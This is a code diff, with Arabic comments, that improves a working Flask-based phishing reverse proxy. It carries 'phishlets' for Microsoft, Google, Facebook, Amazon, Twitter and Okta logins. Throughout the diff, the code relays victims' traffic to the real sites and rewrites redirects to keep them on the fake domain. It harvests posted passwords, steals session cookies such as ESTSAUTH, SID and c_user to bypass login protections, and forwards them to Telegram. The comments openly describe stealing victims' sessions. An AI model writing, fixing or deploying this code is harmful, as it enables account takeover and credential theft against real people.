@@ -1,7 +1,7 @@
 from flask import Flask, request, render_template, make_response, redirect, url_for
 import requests
 import logging
-from urllib.parse import urlparse, urljoin, quote
+from urllib.parse import urlparse, urljoin
 import json
 from datetime import datetime
 import os
@@ -70,7 +70,7 @@ class PhishletHandler:
                 captured[cookie_name] = cookies_dict[cookie_name]
         
         if captured:
-            session_id = datetime.now().strftime("%Y%m%d_%H%%S")
+            session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
             session_data = {
                 'site': self.name,
                 'cookies': captured,
@@ -84,7 +84,7 @@ class PhishletHandler:
             message += f"🕒 **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
             cookie_msg = "\n".join([f"  • `{k}`: `{v[:50]}...`" for k, v in captured.items()])
             message += f"🍪 **Cookies:**\n{cookie_msg}\n"
-            # تم تعديل هذا السطر: لا نستخدم request هنا
+            # نستخدم رابط نسبي لعرض الجلسة
             message += f"🔗 **View Full:** /admin/session/{session_id}"
             self.send_to_telegram(message)
             
@@ -117,49 +117,56 @@ class PhishletHandler:
                     content = content.replace(f"http://{orig_domain}", f"https://{phish_domain}")
                 
                 return content.encode('utf-8')
-            except:
+            except Exception as e:
+                logging.error(f"Rewrite error: {e}")
                 return content
         return content
 
-# ======================== تعريف جميع الخدمات (Phishlets) ========================
+# ======================== تعريف جميع الخدمات (Phishlets) المعدلة ========================
 phishlets = {
     'microsoft': PhishletHandler(
-        name='Microsoft', target_domain='login.live.com',
-        proxy_hosts=[{'phish_sub': 'www', 'orig_sub': 'www', 'domain': 'login.live.com'}],
+        name='Microsoft',
+        target_domain='login.live.com',
+        proxy_hosts=[{'phish_sub': 'www', 'orig_sub': '', 'domain': 'login.live.com'}],  # orig_sub فارغ لأن الموقع لا يستخدم www
         auth_tokens=['ESTSAUTH', 'MSFPC', 'MSPRequ'],
         creds_fields=['login', 'passwd', 'loginfmt', 'Password'],
         auth_urls=['https://account.live.com', 'https://account.microsoft.com']
     ),
     'google': PhishletHandler(
-        name='Google', target_domain='accounts.google.com',
+        name='Google',
+        target_domain='accounts.google.com',
         proxy_hosts=[{'phish_sub': 'accounts', 'orig_sub': 'accounts', 'domain': 'google.com'}],
         auth_tokens=['SAPISID', 'APISID', 'SSID', 'SID', 'LSID'],
         creds_fields=['email', 'password', 'identifier', 'credentials.passwd'],
         auth_urls=['https://myaccount.google.com', 'https://mail.google.com']
     ),
     'facebook': PhishletHandler(
-        name='Facebook', target_domain='www.facebook.com',
+        name='Facebook',
+        target_domain='www.facebook.com',
         proxy_hosts=[{'phish_sub': 'www', 'orig_sub': 'www', 'domain': 'facebook.com'}],
         auth_tokens=['c_user', 'xs', 'fr', 'sb'],
         creds_fields=['email', 'pass'],
         auth_urls=['https://www.facebook.com/?sk=welcome']
     ),
     'amazon': PhishletHandler(
-        name='Amazon', target_domain='www.amazon.com',
+        name='Amazon',
+        target_domain='www.amazon.com',
         proxy_hosts=[{'phish_sub': 'www', 'orig_sub': 'www', 'domain': 'amazon.com'}],
         auth_tokens=['session-id', 'session-token', 'ubid-main', 'x-main'],
         creds_fields=['email', 'password'],
         auth_urls=['https://www.amazon.com/?ref_=nav_signin']
     ),
     'twitter': PhishletHandler(
-        name='Twitter', target_domain='twitter.com',
+        name='Twitter',
+        target_domain='twitter.com',
         proxy_hosts=[{'phish_sub': 'www', 'orig_sub': 'www', 'domain': 'twitter.com'}],
         auth_tokens=['auth_token', 'ct0', 'twid'],
         creds_fields=['session[username_or_email]', 'session[password]'],
         auth_urls=['https://twitter.com/home']
     ),
     'okta': PhishletHandler(
-        name='Okta', target_domain='login.okta.com',
+        name='Okta',
+        target_domain='login.okta.com',
         proxy_hosts=[{'phish_sub': 'login', 'orig_sub': 'login', 'domain': 'okta.com'}],
         auth_tokens=['sid', 'DT', 'oktaStateToken'],
         creds_fields=['username', 'password'],
@@ -194,26 +201,41 @@ def clear_sessions():
 def proxy(path):
     host = request.headers.get('Host', '').split(':')[0]
     
-    # اختيار الخدمة بناءً على الرابط أو استخدام ميكروسوفت كافتراضي
-    current_phishlet = phishlets['microsoft']
+    # اختيار الخدمة بناءً على الرابط (إذا كان النطاق يحتوي على اسم الخدمة)
+    current_phishlet = phishlets['microsoft']  # افتراضي
     for name, phishlet in phishlets.items():
         if name in host or phishlet.target_domain in host:
             current_phishlet = phishlet
             break
     
     target_domain = current_phishlet.target_domain
-    target_sub = 'www'
+    
+    # تحديد النطاق الفرعي الصحيح
+    target_sub = ''
     for proxy_config in current_phishlet.proxy_hosts:
         if proxy_config['phish_sub'] in host:
             target_sub = proxy_config['orig_sub']
             break
     
-    target_url = f"https://{target_sub}.{target_domain}/{path}" if not path.startswith('http') else path
+    # بناء URL الهدف الحقيقي
+    if path.startswith('http'):
+        target_url = path
+    else:
+        if target_sub:
+            target_url = f"https://{target_sub}.{target_domain}/{path}"
+        else:
+            target_url = f"https://{target_domain}/{path}"
     
     try:
-        # تصفية الترويسات لتجنب مشاكل البروكسي
-        headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'content-length', 'accept-encoding']}
-        headers['User-Agent'] = request.headers.get('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+        # تجهيز الترويسات
+        headers = {}
+        for k, v in request.headers:
+            if k.lower() not in ['host', 'content-length', 'accept-encoding', 'connection']:
+                headers[k] = v
+        
+        # إضافة User-Agent إذا لم يكن موجوداً
+        if 'User-Agent' not in headers:
+            headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
         
         if request.headers.get('Referer'):
             headers['Referer'] = request.headers['Referer'].replace(host, target_domain)
@@ -221,19 +243,24 @@ def proxy(path):
         data = request.get_data()
         if request.method == 'POST' and request.form:
             current_phishlet.capture_credentials(request.form.to_dict())
-
-        # تنفيذ الطلب للموقع الأصلي
+        
+        # تنفيذ الطلب إلى الموقع الأصلي
         resp = requests.request(
-            method=request.method, url=target_url, headers=headers, 
-            cookies=request.cookies, data=data, verify=False, 
-            allow_redirects=False, timeout=30
+            method=request.method,
+            url=target_url,
+            headers=headers,
+            cookies=request.cookies,
+            data=data,
+            verify=False,
+            allow_redirects=False,
+            timeout=30
         )
         
         # تصفية ترويسات الاستجابة
         excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection', 'strict-transport-security']
         response_headers = [(name, value) for name, value in resp.raw.headers.items() if name.lower() not in excluded_headers]
         
-        # تعديل المحتوى (استبدال الروابط)
+        # تعديل المحتوى
         content = current_phishlet.rewrite_content(resp.content, resp.headers.get('Content-Type', ''), host)
         response = make_response(content)
         response.status_code = resp.status_code
@@ -241,28 +268,35 @@ def proxy(path):
         for name, value in response_headers:
             response.headers[name] = value
         
-        # نقل الكوكيز وسرقة الجلسة
+        # نقل الكوكيز إلى الضحية
         for cookie_name, cookie_value in resp.cookies.items():
-            response.set_cookie(cookie_name, cookie_value, domain=host, secure=True, httponly=True, samesite='Lax')
+            response.set_cookie(
+                cookie_name, cookie_value,
+                domain=host, secure=True, httponly=True, samesite='Lax'
+            )
         
+        # التقاط جلسة جديدة إذا وجدت
         if resp.cookies:
             current_phishlet.capture_session_cookies(resp.cookies)
-            
+        
         # تعديل روابط التوجيه (Redirects) لتبقى في موقعنا
-        if resp.status_code in [301, 302, 303]:
+        if resp.status_code in [301, 302, 303, 307, 308]:
             location = resp.headers.get('Location', '')
-            if target_domain in location:
-                response.headers['Location'] = location.replace(target_domain, host)
-            for auth_url in current_phishlet.auth_urls:
-                if auth_url in location:
-                    current_phishlet.capture_session_cookies(resp.cookies)
+            if location:
+                if target_domain in location:
+                    new_location = location.replace(target_domain, host)
+                    response.headers['Location'] = new_location
+                # التحقق من وجود auth_urls في الرابط
+                for auth_url in current_phishlet.auth_urls:
+                    if auth_url in location:
+                        current_phishlet.capture_session_cookies(resp.cookies)
         
         return response
+        
     except Exception as e:
         logging.error(f"Proxy error: {str(e)}")
         return f"Error: {str(e)}", 500
 
 if __name__ == '__main__':
-    # المنفذ الافتراضي لـ Render (يُقرأ من متغير البيئة PORT أو 10000)
     port = int(os.environ.get('PORT', 10000))
     app.run(host='0.0.0.0', port=port)
